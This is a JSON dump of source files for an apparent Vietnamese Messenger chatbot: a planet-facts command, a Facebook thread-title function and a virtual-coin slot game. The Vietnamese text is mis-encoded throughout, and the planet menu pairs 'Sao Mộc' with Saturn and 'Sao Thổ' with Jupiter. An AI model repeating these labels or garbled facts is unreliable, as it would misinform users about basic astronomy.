c·ªßa c√°c tinh th·ªÉ amonia trong t·∫ßng th∆∞·ª£ng quy·ªÉn. D√≤ng ƒëi·ªán b√™n trong l·ªõp hiƒër√¥ kim lo·∫°i l√† nguy√™n nh√¢n Sao Th·ªï c√≥ m·ªôt t·ª´ tr∆∞·ªùng h√†nh tinh v·ªõi c∆∞·ªùng ƒë·ªô h∆°i y·∫øu h∆°n so v·ªõi t·ª´ tr∆∞·ªùng c·ªßa Tr√°i ƒê·∫•t v√† b·∫±ng m·ªôt ph·∫ßn m∆∞·ªùi hai so v·ªõi c∆∞·ªùng ƒë·ªô t·ª´ tr∆∞·ªùng c·ªßa Sao M·ªôc. L·ªõp kh√≠ quy·ªÉn b√™n tr√™n c√πng h√†nh tinh c√≥ nh·ªØng m√†u ƒë·ªìng nh·∫•t v√† hi·ªán l√™n d∆∞·ªùng nh∆∞ y√™n ·∫£ so v·ªõi b·∫ßu kh√≠ quy·ªÉn h·ªón lo·∫°n c·ªßa Sao M·ªôc, m·∫∑c d√π n√≥ c≈©ng c√≥ nh·ªØng c∆°n b√£o m·∫°nh. T·ªëc ƒë·ªô gi√≥ tr√™n Sao Th·ªï c√≥ th·ªÉ ƒë·∫°t t·ªõi 1.800 km/h, nhanh h∆°n tr√™n Sao M·ªôc, nh∆∞ng kh√¥ng nhanh b·∫±ng t·ªëc ƒë·ªô gi√≥ tr√™n Sao H·∫£i V∆∞∆°ng.Sao Th·ªï c√≥ m·ªôt h·ªá th·ªëng v√†nh ƒëai bao g·ªìm ch√≠n v√†nh ch√≠nh li√™n t·ª•c v√† ba cung ƒë·ª©t ƒëo·∫°n, ch√∫ng ch·ª©a ch·ªß y·∫øu h·∫°t bƒÉng v·ªõi l∆∞·ª£ng nh·ªè b·ª•i v√† ƒë√°. Sao Th·ªï c√≥ 82 v·ªá tinh t·ª± nhi√™n ƒë√£ bi·∫øt; trong ƒë√≥ 53 v·ªá tinh ƒë√£ ƒë∆∞·ª£c ƒë·∫∑t t√™n. S·ªë l∆∞·ª£ng v·ªá tinh n√†y kh√¥ng bao g·ªìm h√†ng trƒÉm ti·ªÉu v·ªá tinh (moonlet) b√™n trong v√†nh ƒëai. Titan l√† v·ªá tinh l·ªõn nh·∫•t c·ªßa Sao Th·ªï v√† l√† v·ªá tinh l·ªõn th·ª© hai trong H·ªá M·∫∑t Tr·ªùi, n√≥ c≈©ng l·ªõn h∆°n c·∫£ Sao Th·ªßy v√† l√† v·ªá tinh t·ª± nhi√™n duy nh·∫•t trong H·ªá M·∫∑t Tr·ªùi c√≥ b·∫ßu kh√≠ quy·ªÉn d√†y ƒë·∫∑c..\", threadID, messageID); break;\n                case 8: api.sendMessage(\"8. Sao Th·ªßy - Mecury\\n\\nSao Th·ªßy (Mercury) hay Th·ªßy tinh (ch·ªØ H√°n: Ê∞¥Êòü) l√† h√†nh tinh nh·ªè nh·∫•t v√† g·∫ßn M·∫∑t Tr·ªùi nh·∫•t trong t√°m h√†nh tinh thu·ªôc H·ªá M·∫∑t Tr·ªùi, v·ªõi chu k·ª≥ qu·ªπ ƒë·∫°o b·∫±ng 88 ng√†y Tr√°i ƒê·∫•t. Nh√¨n t·ª´ Tr√°i ƒê·∫•t, h√†nh tinh hi·ªán l√™n v·ªõi chu k·ª≥ giao h·ªôi tr√™n qu·ªπ ƒë·∫°o b·∫±ng x·∫•p x·ªâ 116 ng√†y, v√† nhanh h∆°n h·∫≥n nh·ªØng h√†nh tinh kh√°c. T·ªëc ƒë·ªô chuy·ªÉn ƒë·ªông nhanh n√†y ƒë√£ khi·∫øn ng∆∞·ªùi La M√£ ƒë·∫∑t t√™n h√†nh tinh l√† Mercurius, v·ªã th·∫ßn li√™n l·∫°c v√† ƒë∆∞a tin m·ªôt c√°ch nhanh ch√≥ng. Trong th·∫ßn tho·∫°i Hy L·∫°p t√™n c·ªßa v·ªã th·∫ßn n√†y l√† Hermes (ŒïœÅŒºŒÆœÇ). T√™n ti·∫øng Vi·ªát c·ªßa h√†nh tinh n√†y d·ª±a theo t√™n do Trung Qu·ªëc ƒë·∫∑t, ch·ªçn theo h√†nh th·ªßy trong ng≈© h√†nh.\\nDo h√†nh tinh h·∫ßu nh∆∞ kh√¥ng c√≥ kh√≠ quy·ªÉn ƒë·ªÉ gi·ªØ l·∫°i nhi·ªát l∆∞·ª£ng, b·ªÅ m·∫∑t Sao Th·ªßy tr·∫£i qua s·ª± bi·∫øn ƒë·ªïi nhi·ªát ƒë·ªô l·ªõn nh·∫•t trong s·ªë c√°c h√†nh tinh, thay ƒë·ªïi t·ª´ 100 K (‚àí173 ¬∞C; ‚àí280 ¬∞F) v√†o ban ng√†y t·ªõi 700 K (427 ¬∞C; 800 ¬∞F) v√†o ban ng√†y. Tr·ª•c quay c·ªßa Sao Th·ªßy c√≥ ƒë·ªô nghi√™ng nh·ªè nh·∫•t trong H·ªá M·∫∑t Tr·ªùi (kho·∫£ng 1‚ÅÑ30 ƒë·ªô), nh∆∞ng h√†nh tinh l·∫°i c√≥ ƒë·ªô l·ªách t√¢m qu·ªπ ƒë·∫°o l·ªõn nh·∫•t. T·∫°i vi·ªÖn ƒëi·ªÉm qu·ªπ ƒë·∫°o, Sao Th·ªßy ·ªü c√°ch xa M·∫∑t Tr·ªùi h∆°n 1,5 l·∫ßn khi so v·ªõi h√†nh tinh ·ªü c·∫≠n ƒëi·ªÉm qu·ªπ ƒë·∫°o. B·ªÅ m·∫∑t h√†nh tinh c√≥ r·∫•t nhi·ªÅu h·ªë va ch·∫°m nh√¨n tr√¥ng gi·ªëng nh∆∞ b·ªÅ m·∫∑t c·ªßa M·∫∑t TrƒÉng, v√† h√†nh tinh kh√¥ng c√≤n ho·∫°t ƒë·ªông ƒë·ªãa ch·∫•t trong h√†ng t·ª∑ nƒÉm tr∆∞·ªõc.\\nTr√™n Sao Th·ªßy kh√¥ng c√≥ s·ª± bi·∫øn ƒë·ªïi th·ªùi ti·∫øt theo m√πa nh∆∞ ·ªü c√°c h√†nh tinh kh√°c b·ªüi v√¨ n√≥ kh√¥ng c√≥ b·∫ßu kh√≠ quy·ªÉn ƒë√°ng k·ªÉ. H√†nh tinh b·ªã kh√≥a th·ªßy tri·ªÅu v·ªõi M·∫∑t Tr·ªùi do ƒë√≥ n√≥ quay tr√™n qu·ªπ ƒë·∫°o r·∫•t kh√°c so v·ªõi c√°c h√†nh tinh kh√°c. Khi l·∫•y c√°c ng√¥i sao c·ªë ƒë·ªãnh l√†m ƒëi·ªÉm m·ªëc, n√≥ t·ª± quay ƒë∆∞·ª£c ch√≠nh x√°c ba v√≤ng trong hai chu k·ª≥ qu·ªπ ƒë·∫°o quanh M·∫∑t Tr·ªùi . Khi nh√¨n t·ª´ M·∫∑t Tr·ªùi, trong h·ªá quy chi·∫øu quay c√πng v·ªõi chuy·ªÉn ƒë·ªông qu·ªπ ƒë·∫°o, h√†nh tinh hi·ªán l√™n ch·ªâ quay quanh tr·ª•c m·ªôt l·∫ßn trong hai (nƒÉm) Sao Th·ªßy. Do v·∫≠y n·∫øu c√≥ ng∆∞·ªùi ƒë·ª©ng tr√™n Sao Th·ªßy h·ªç ch·ªâ nh·∫≠n th·∫•y 1 ng√†y trong 2 nƒÉm.\\nB·ªüi v√¨ qu·ªπ ƒë·∫°o Th·ªßy Tinh n·∫±m b√™n trong qu·ªπ ƒë·∫°o Tr√°i ƒê·∫•t (v√† c·ªßa Sao Kim), khi nh√¨n t·ª´ Tr√°i ƒê·∫•t h√†nh tinh c√≥ l√∫c hi·ªán l√™n v√†o bu·ªïi s√°ng ho·∫∑c v√†o bu·ªïi t·ªëi, nh∆∞ng kh√¥ng bao gi·ªù c√≥ th·ªÉ nh√¨n th·∫•y l√∫c n·ª≠a ƒë√™m. T∆∞∆°ng t·ª± nh∆∞ Sao Kim v√† M·∫∑t TrƒÉng, h√†nh tinh c≈©ng c√≥ c√°c pha quan s√°t khi n√≥ di chuy·ªÉn tr√™n qu·ªπ ƒë·∫°o. Sao Th·ªßy kh√¥ng c√≥ m·ªôt v·ªá tinh t·ª± nhi√™n n√†o. ƒê·ªô s√°ng bi·ªÉu ki·∫øn c·ªßa Sao Th·ªßy thay ƒë·ªïi t·ª´ ‚àí2,0 ƒë·∫øn 5,5; nh∆∞ng v√¨ qu√° g·∫ßn M·∫∑t Tr·ªùi n√™n n·∫øu quan s√°t h√†nh tinh n√†y qua k√≠nh vi·ªÖn v·ªçng r·∫•t kh√≥ khƒÉn v√† √≠t khi th·ª±c hi·ªán ƒë∆∞·ª£c.\\nHai phi thuy·ªÅn ƒë√£ gh√© thƒÉm sao Th·ªßy: Mariner 10 bay v√†o nƒÉm 1974 v√† 1975; v√† MESSENGER, ƒë∆∞·ª£c ph√≥ng l√™n v√†o nƒÉm 2004, ƒë√£ quay quanh sao Th·ªßy h∆°n 4.000 l·∫ßn trong v√≤ng b·ªën nƒÉm tr∆∞·ªõc khi c·∫°n ki·ªát ngu·ªìn nhi√™n li·ªáu v√† r∆°i v√†o b·ªÅ m·∫∑t h√†nh tinh n√†y v√†o ng√†y 30 th√°ng 4 nƒÉm 2015.\", threadID, messageID); break;\n                case 9: api.sendMessage(\"9. Sao H·∫£i V∆∞∆°ng - Neptune\\n\\nSao H·∫£i V∆∞∆°ng (Neptune) hay H·∫£i V∆∞∆°ng tinh (ch·ªØ H√°n: Êµ∑ÁéãÊòü) l√† h√†nh tinh th·ª© t√°m v√† xa nh·∫•t t√≠nh t·ª´ M·∫∑t Tr·ªùi trong H·ªá M·∫∑t Tr·ªùi. N√≥ l√† h√†nh tinh l·ªõn th·ª© t∆∞ v·ªÅ ƒë∆∞·ªùng k√≠nh v√† l·ªõn th·ª© ba v·ªÅ kh·ªëi l∆∞·ª£ng. Sao H·∫£i V∆∞∆°ng c√≥ kh·ªëi l∆∞·ª£ng ri√™ng l·ªõn nh·∫•t trong s·ªë c√°c h√†nh tinh kh√≠ trong h·ªá M·∫∑t tr·ªùi. Sao H·∫£i V∆∞∆°ng c√≥ kh·ªëi l∆∞·ª£ng g·∫•p 17 l·∫ßn kh·ªëi l∆∞·ª£ng c·ªßa Tr√°i ƒê·∫•t v√† h∆°i l·ªõn h∆°n kh·ªëi l∆∞·ª£ng c·ªßa Sao Thi√™n V∆∞∆°ng (x·∫•p x·ªâ b·∫±ng 15 l·∫ßn c·ªßa Tr√°i ƒê·∫•t). Sao H·∫£i V∆∞∆°ng quay tr√™n qu·ªπ ƒë·∫°o quanh M·∫∑t Tr·ªùi ·ªü kho·∫£ng c√°ch trung b√¨nh 30,1 AU, b·∫±ng kho·∫£ng 30 l·∫ßn kho·∫£ng c√°ch Tr√°i ƒê·∫•t - M·∫∑t Tr·ªùi. Sao H·∫£i V∆∞∆°ng ƒë∆∞·ª£c ƒë·∫∑t t√™n theo v·ªã th·∫ßn bi·ªÉn c·∫£ c·ªßa ng∆∞·ªùi La M√£ (Neptune). N√≥ c√≥ k√Ω hi·ªáu thi√™n vƒÉn l√† ‚ôÜ, l√† bi·ªÉu t∆∞·ª£ng c√°ch ƒëi·ªáu c√¢y ƒëinh ba c·ªßa th·∫ßn Neptune.\\nSao H·∫£i V∆∞∆°ng l√† h√†nh tinh ƒë·∫ßu ti√™n ƒë∆∞·ª£c t√¨m th·∫•y b·∫±ng t√≠nh to√°n l√Ω thuy·∫øt. D·ª±a v√†o s·ª± nhi·ªÖu lo·∫°n b·∫•t th∆∞·ªùng c·ªßa qu·ªπ ƒë·∫°o Sao Thi√™n V∆∞∆°ng, nh√† thi√™n vƒÉn Alexis Bouvard ƒë√£ k·∫øt lu·∫≠n r·∫±ng qu·ªπ ƒë·∫°o c·ªßa n√≥ b·ªã nhi·ªÖu lo·∫°n do t∆∞∆°ng t√°c h·∫•p d·∫´n v·ªõi m·ªôt h√†nh tinh n√†o ƒë√≥. V√†o ng√†y 23 th√°ng 9 nƒÉm 1846, nh√† thi√™n vƒÉn Johann Galle ƒë√£ ph√°t hi·ªán ra Sao H·∫£i V∆∞∆°ng ·ªü v·ªã tr√≠ l·ªách 1 ƒë·ªô so v·ªõi ti√™n ƒëo√°n c·ªßa Urbain Le Verrier. Sau ƒë√≥ √≠t l√¢u, ng∆∞·ªùi ta c≈©ng kh√°m ph√° ra Triton, v·ªá tinh l·ªõn nh·∫•t c·ªßa sao H·∫£i V∆∞∆°ng, trong khi 13 v·ªá tinh c√≤n l·∫°i c·ªßa n√≥ ch·ªâ ƒë∆∞·ª£c ph√°t hi·ªán trong th·∫ø k·ª∑ XX. Cho t·ªõi nay, t√†u kh√¥ng gian Voyager 2 l√† t√†u duy nh·∫•t bay qua Sao H·∫£i V∆∞∆°ng v√†o ng√†y 25 th√°ng 8 nƒÉm 1989.\\nSao H·∫£i V∆∞∆°ng c√≥ c·∫•u t·∫°o t∆∞∆°ng t·ª± nh∆∞ Sao Thi√™n V∆∞∆°ng, nh∆∞ng l·∫°i kh√°c bi·ªát v·ªõi nh·ªØng h√†nh tinh kh√≠ kh·ªïng l·ªì nh∆∞ Sao M·ªôc v√† Sao Th·ªï. Kh√≠ quy·ªÉn c·ªßa sao H·∫£i V∆∞∆°ng ch·ª©a th√†nh ph·∫ßn c∆° b·∫£n l√† hydro v√† heli, c√πng m·ªôt s·ªë √≠t c√°c hydrocarbon v√† c√≥ l·∫Ω c·∫£ nit∆°, t∆∞∆°ng t·ª± nh∆∞ c·ªßa Sao M·ªôc hay Sao Th·ªï. Tuy nhi√™n kh√≠ quy·ªÉn c·ªßa n√≥ ch·ª©a t·ª∑ l·ªá l·ªõn h∆°n c√°c ph√¢n t·ª≠ (bƒÉng) nh∆∞ n∆∞·ªõc, amonia, v√† methan. Do ƒë√≥ c√°c nh√† thi√™n vƒÉn th·ªânh tho·∫£ng ph√¢n lo·∫°i Sao Thi√™n V∆∞∆°ng v√† Sao H·∫£i V∆∞∆°ng th√†nh c√°c h√†nh tinh bƒÉng ƒë√° kh·ªïng l·ªì ƒë·ªÉ nh·∫•n m·∫°nh s·ª± kh√°c bi·ªát n√†y. B√™n trong Sao H·∫£i V∆∞∆°ng ch·ª©a ch·ªß y·∫øu bƒÉng v√† ƒë√°, gi·ªëng nh∆∞ Sao Thi√™n V∆∞∆°ng. L√µi h√†nh tinh c√≥ th·ªÉ c√≥ b·ªÅ m·∫∑t tuy r·∫Øn nh∆∞ng nhi·ªát ƒë·ªô c·ªßa n√≥ c√≥ th·ªÉ cao t·ªõi h√†ng ngh√¨n ƒë·ªô v√† √°p su·∫•t r·∫•t l·ªõn. Kh√≠ methan trong t·∫ßng ngo√†i kh√≠ quy·ªÉn l√† nguy√™n nh√¢n Sao H·∫£i V∆∞∆°ng hi·ªán l√™n v·ªõi m√†u xanh lam.\\nTr√°i ng∆∞·ª£c v·ªõi b·∫ßu kh√≠ quy·ªÉn m·ªù ƒë·∫∑c v√† g·∫ßn nh∆∞ ƒë·ªìng m√†u c·ªßa Sao Thi√™n V∆∞∆°ng, kh√≠ quy·ªÉn c·ªßa Sao H·∫£i V∆∞∆°ng c√≥ nh·ªØng v√πng ho·∫°t ƒë·ªông m·∫°nh v√† d·ªÖ nh·∫≠n th·∫•y. NƒÉm 1989, t√†u Voyager 2 khi bay qua Sao H·∫£i V∆∞∆°ng ƒë√£ ch·ª•p ƒë∆∞·ª£c h√¨nh ·∫£nh c·ªßa V·∫øt T·ªëi L·ªõn tr√™n b√°n c·∫ßu nam c√≥ k√≠ch th∆∞·ªõc t∆∞∆°ng ƒë∆∞∆°ng v·ªõi V·∫øt ƒê·ªè L·ªõn c·ªßa Sao M·ªôc. Nh·ªØng v√πng ho·∫°t ƒë·ªông th·ªùi ti·∫øt n√†y ƒë∆∞·ª£c duy tr√¨ b·ªüi nh·ªØng c∆°n gi√≥ v·ªõi t·ªëc ƒë·ªô l√™n t·ªõi 2.100 kil√¥m√©t tr√™n gi·ªù, m·∫°nh nh·∫•t tr√™n kh√≠ quy·ªÉn trong c√°c h√†nh tinh thu·ªôc H·ªá M·∫∑t Tr·ªùi. Do c√°ch r·∫•t xa M·∫∑t Tr·ªùi n√™n l·ªõp kh√≠ quy·ªÉn ngo√†i c√πng c·ªßa Sao H·∫£i V∆∞∆°ng l√† m·ªôt trong nh·ªØng n∆°i l·∫°nh nh·∫•t trong H·ªá M·∫∑t Tr·ªùi. Nhi·ªát ƒë·ªô c·ªßa nh·ªØng ƒë√°m m√¢y tr√™n cao kho·∫£ng 55 K (-218 ¬∞C) trong khi nhi·ªát ƒë·ªô t·∫°i l√µi h√†nh tinh x·∫•p x·ªâ 5.400 K (5.000 ¬∞C). Sao H·∫£i V∆∞∆°ng c√≥ m·ªôt h·ªá th·ªëng v√†nh ƒëai m·ªù v√† r·ªùi r·∫°c (hay nh·ªØng cung), ƒë∆∞·ª£c ph√°t hi·ªán trong th·∫≠p ni√™n 1960 nh∆∞ng ch·ªâ ƒë∆∞·ª£c x√°c nh·∫≠n v√†o nƒÉm 1989 b·ªüi Voyager 2.\", threadID, messageID); break;\n                case 10: api.sendMessage(\"10. M·∫∑t TrƒÉng - The Moon üåï\\n\\nTrong ti·∫øng Vi·ªát, M·∫∑t TrƒÉng c√≤n ƒë∆∞·ª£c g·ªçi b·∫±ng nh·ªØng t√™n kh√°c nh∆∞ √¥ng TrƒÉng, Nguy·ªát (Êúà), H·∫±ng Nga (hay Th∆∞·ªùng Nga), Th√°i √Çm (Â§™Èô∞), v.v... Kh√¥ng gi·ªëng nh∆∞ v·ªá tinh c·ªßa nh·ªØng h√†nh tinh kh√°c, M·∫∑t TrƒÉng - v·ªá tinh c·ªßa Tr√°i ƒê·∫•t - kh√¥ng c√≥ t√™n ri√™ng n√†o kh√°c. Trong m·ªôt s·ªë ng√¥n ng·ªØ, M·∫∑t TrƒÉng c·ªßa Tr√°i ƒê·∫•t ƒë∆∞·ª£c vi·∫øt hoa ƒë·ªÉ ph√¢n bi·ªát v·ªõi danh t·ª´ chung (m·∫∑t trƒÉng), n√≥i ƒë·∫øn c√°c v·ªá tinh t·ª± nhi√™n c·ªßa c√°c h√†nh tinh kh√°c nh∆∞ (the Moon) trong ti·∫øng Anh v√† (the moon).\\nT·ª´ moon (M·∫∑t TrƒÉng - trong ti·∫øng Anh) l√† m·ªôt t·ª´ thu·ªôc nh√≥m ng√¥n ng·ªØ German, li√™n quan t·ªõi t·ª´ mensis trong ti·∫øng Latin; t·ª´ n√†y l·∫°i xu·∫•t ph√°t t·ª´ g·ªëc me- trong ng√¥n ng·ªØ ·∫§n-√Çu nguy√™n th·ªßy (Proto-Indo-European), c≈©ng xu·∫•t hi·ªán trong measure (ƒëo l∆∞·ªùng) (th·ªùi gian), v·ªõi s·ª± g·ª£i nh·ªõ t·ªõi t·∫ßm quan tr·ªçng c·ªßa n√≥ trong vi·ªác ƒëo ƒë·∫°c th·ªùi gian trong nh·ªØng t·ª´ c√≥ ngu·ªìn g·ªëc t·ª´ n√≥ nh∆∞ Monday (th·ª© Hai - trong ti·∫øng Anh), month (th√°ng - trong ti·∫øng Anh) v√† menstrual (h√†ng th√°ng/kinh nguy·ªát). Trong ti·∫øng Anh, t·ª´ moon ch·ªâ c√≥ nghƒ©a (M·∫∑t TrƒÉng) cho t·ªõi t·∫≠n nƒÉm 1665, khi n√≥ ƒë∆∞·ª£c m·ªü r·ªông nghƒ©a ƒë·ªÉ ch·ªâ nh·ªØng v·ªá tinh t·ª± nhi√™n m·ªõi ƒë∆∞·ª£c kh√°m ph√° c·ªßa c√°c h√†nh tinh kh√°c. M·∫∑t TrƒÉng th·ªânh tho·∫£ng c≈©ng ƒë∆∞·ª£c g·ªçi theo t√™n ti·∫øng Latin c·ªßa n√≥, Luna, ƒë·ªÉ ph√¢n bi·ªát v·ªõi c√°c v·ªá tinh t·ª± nhi√™n; t√≠nh t·ª´ c√≥ li√™n quan l√† lunar v√† m·ªôt ti·ªÅn t·ªë t√≠nh t·ª´ seleno - hay h·∫≠u t·ªë -selene (theo t√™n v·ªã th·∫ßn Hy L·∫°p Selene).Kho·∫£ng c√°ch trung b√¨nh t√≠nh t·ª´ t√¢m Tr√°i ƒê·∫•t ƒë·∫øn M·∫∑t TrƒÉng l√† 384.403 km, l·ªõn kho·∫£ng 30 l·∫ßn ƒë∆∞·ªùng k√≠nh Tr√°i ƒê·∫•t. ƒê∆∞·ªùng k√≠nh M·∫∑t TrƒÉng l√† 3.474 km, b·∫±ng 27% ƒë∆∞·ªùng k√≠nh Tr√°i ƒê·∫•t. Kh·ªëi l∆∞·ª£ng M·∫∑t TrƒÉng kho·∫£ng b·∫±ng 2% kh·ªëi l∆∞·ª£ng Tr√°i ƒê·∫•t v√† l·ª±c h·∫•p d·∫´n t·∫°i b·ªÅ m·∫∑t M·∫∑t TrƒÉng b·∫±ng 17% l·ª±c h·∫•p d·∫´n tr√™n b·ªÅ m·∫∑t Tr√°i ƒê·∫•t. M·∫∑t TrƒÉng quay m·ªôt v√≤ng quanh Tr√°i ƒê·∫•t v·ªõi chu k·ª≥ qu·ªπ ƒë·∫°o 27,32 ng√†y, v√† c√°c bi·∫øn ƒë·ªïi ƒë·ªãnh k·ª≥ trong h√¨nh h·ªçc c·ªßa h·ªá Tr√°i ƒê·∫•t ‚Äì M·∫∑t TrƒÉng ‚Äì M·∫∑t Tr·ªùi l√† nguy√™n nh√¢n g√¢y ra c√°c pha M·∫∑t TrƒÉng, l·∫∑p l·∫°i sau m·ªói chu k·ª≥ giao h·ªôi t·∫ßm 29,53 ng√†y.\", threadID, messageID); break;\n                default:\n                    if (choose < 1 || choose > 10) {\n                        return api.sendMessage(\"üî∞L·ª±a ch·ªçn kh√¥ng n·∫±m trong danh s√°ch.\", threadID, messageID);\n                    }\n            }\n        }\n    }\n};\n\nmodule.exports.run = async ({ api, event, handleReply }) => {\n    const { threadID, messageID, senderID } = event;\n    return api.sendMessage({\n        body: \"==== ü™ê C√°c h√†nh tinh üåå ====\" +\n            \"\\n1. H·ªá M·∫∑t Tr·ªùi - The Sun\" +\n            \"\\n2. Tr√°i ƒê·∫•t - Earth\" +\n            \"\\n3. Sao H·ªèa - Mars\" +\n            \"\\n4. Sao Kim - Venus\" +\n            \"\\n5. Sao M·ªôc - Saturn\" +\n            \"\\n6. Sao Thi√™n V∆∞∆°ng - Uranus\" +\n            \"\\n7. Sao Th·ªï - Jupiter\" +\n            \"\\n8. Sao Th·ªßy - Mecury\" +\n            \"\\n9. Sao H·∫£i V∆∞∆°ng - Neptune\" +\n            \"\\n10. M·∫∑t TrƒÉng - The Moon\" +\n            \"\\n\\nüåàReply tin nh·∫Øn theo s·ªë ƒë·ªÉ xem th√™m v·ªÅ c√°c h√†nh tinh xung quanh ch√∫ng ta nh√© ‚ù§\",\n        attachment: fs.existsSync(__dirname + `/cache/·∫£nh/hanhtinh.jpg`) \n            ? fs.createReadStream(__dirname + `/cache/·∫£nh/hanhtinh.jpg`) \n            : null\n    }, threadID, (error, info) => {\n        if (error) {\n            console.log(error);\n        } else {\n            global.client.handleReply.push({\n                type: \"choosee\",\n                name: this.config.name,\n                author: senderID,\n                messageID: info.messageID\n            });\n        }\n    });\n};\n","path":null,"size_bytes":36541,"size_tokens":null},"lib/fca-auto/src/setTitle.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function setTitle(newTitle, threadID, callback) {\n    if (\n      !callback &&\n      (utils.getType(threadID) === \"Function\" ||\n        utils.getType(threadID) === \"AsyncFunction\")\n    ) throw { error: \"please pass a threadID as a second argument.\" };\n\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      author_email: \"\",\n      coordinates: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\",\n      is_unread: false,\n      is_cleared: false,\n      is_forward: false,\n      is_filtered_content: false,\n      is_spoof_warning: false,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      status: \"0\",\n      offline_threading_id: messageAndOTID,\n      message_id: messageAndOTID,\n      threading_id: utils.generateThreadingID(ctx.clientID),\n      manual_retry_cnt: \"0\",\n      thread_fbid: threadID,\n      thread_name: newTitle,\n      thread_id: threadID,\n      log_message_type: \"log:thread-name\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/set_thread_name/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error && resData.error === 1545012) throw { error: \"Cannot change chat title: Not member of chat.\" };\n        if (resData.error && resData.error === 1545003) throw { error: \"Cannot set title of single-user chat.\" };\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"setTitle\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2309,"size_tokens":null},"modules/commands/777.js":{"content":"module.exports.config = {\n    name: \"777\",\n    version: \"1.0.1\",\n    hasPermssion: 0,\n    credits: \"Mirai Team\",\n    description: \"ƒê√°nh b·∫°c b·∫±ng h√¨nh th·ª©c hoa qu·∫£\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"[s·ªë coin c·∫ßn ƒë·∫∑t]\",\n    cooldowns: 5,\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"missingInput\": \"[ SLOT ] S·ªë ti·ªÅn ƒë·∫∑t c∆∞·ª£c kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng ho·∫∑c l√† s·ªë √¢m\",\n        \"moneyBetNotEnough\": \"[ SLOT ] S·ªë ti·ªÅn b·∫°n ƒë·∫∑t l·ªõn h∆°n ho·∫∑c b·∫±ng s·ªë d∆∞ c·ªßa b·∫°n!\",\n        \"limitBet\": \"[ SLOT ] S·ªë coin ƒë·∫∑t kh√¥ng ƒë∆∞·ª£c d∆∞·ªõi 50$!\",\n        \"returnWin\": \"üé∞ %1 | %2 | %3 üé∞\\nB·∫°n ƒë√£ th·∫Øng v·ªõi %4$\",\n        \"returnLose\": \"üé∞ %1 | %2 | %3 üé∞\\nB·∫°n ƒë√£ thua v√† m·∫•t %4$\"\n    },\n    \"en\": {\n        \"missingInput\": \"[ SLOT ] The bet money must not be blank or a negative number\",\n        \"moneyBetNotEnough\": \"[ SLOT ] The money you betted is bigger than your balance!\",\n        \"limitBet\": \"[ SLOT ] Your bet is too low, the minimum is 50$\",\n        \"returnWin\": \"üé∞ %1 | %2 | %3 üé∞\\nYou won with %4$\",\n        \"returnLose\": \"üé∞ %1 | %2 | %3 üé∞\\nYou lost and loss %4$\"\n    }\n}\n\nmodule.exports.run = async function({ api, event, args, Currencies, getText }) {\n    const { threadID, messageID, senderID } = event;\n    const { getData, increaseMoney, decreaseMoney } = Currencies;\n    const slotItems = [\"üçá\", \"üçâ\", \"üçä\", \"üçè\", \"7‚É£\", \"üçì\", \"üçí\", \"üçå\", \"ü•ù\", \"ü•ë\", \"üåΩ\"];\n    const moneyUser = (await getData(senderID)).money;\n\n    var moneyBet = parseInt(args[0]);\n    if (isNaN(moneyBet) || moneyBet <= 0) return api.sendMessage(getText(\"missingInput\"), threadID, messageID);\n\tif (moneyBet > moneyUser) return api.sendMessage(getText(\"moneyBetNotEnough\"), threadID, messageID);\n\tif (moneyBet < 50) return api.sendMessage(getText(\"limitBet\"), threadID, messageID);\n    var number = [], win = false;\n    for (i = 0; i < 3; i++) number[i] = Math.floor(Math.random() * slotItems.length);\n    if (number[0] == number[1] && number[1] == number[2]) {\n        moneyBet *= 9;\n        win = true;\n    }\n    else if (number[0] == number[1] || number[0] == number[2] || number[1] == number[2]) {\n        moneyBet *= 2;\n        win = true;\n    }\n    switch (win) {\n        case true: {\n            api.sendMessage(getText(\"returnWin\", slotItems[number[0]], slotItems[number[1]], slotItems[number[2]], moneyBet), threadID, messageID);\n            await increaseMoney(senderID, moneyBet);\n            break;\n        }\n        case false: {\n            api.sendMessage(getText(\"returnLose\", slotItems[number[0]], slotItems[number[1]], slotItems[number[2]], moneyBet), threadID, messageID);\n            await decreaseMoney(senderID, moneyBet);\n            break;\n        }\n    }\n}","path":null,"size_bytes":2793,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/ExtraGetThread.js":{"content":"/* eslint-disable */\n\"use strict\";\nvar Database= require(\"./Database\");\nconst { lastRun,capture } = require('./Src/Last-Run');\nconst logger = require(\"../logger\");\nconst getText = global.Fca.getText;\nvar language = require(\"../Language/index.json\");\nconst fs = require(\"fs\");\nlanguage = language.find(i => i.Language == require(process.cwd() + \"/FastConfigFca.json\").Language).Folder.ExtraGetThread;\nconst Always_True = [];\nif (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n    if (!fs.existsSync(process.cwd() + \"/Horizon_Database/Threads.json\")) {\n        fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify({}));\n    }\n}\nelse if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type != \"default\" && global.Fca.Require.FastConfig.AntiGetInfo.Database_Type != \"json\") {\n    logger.Warning(\"Database_Type in FastConfigFca.json is not valid. Only default and json are valid.\");\n    process.exit(0);\n}\n\nexports.createData = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        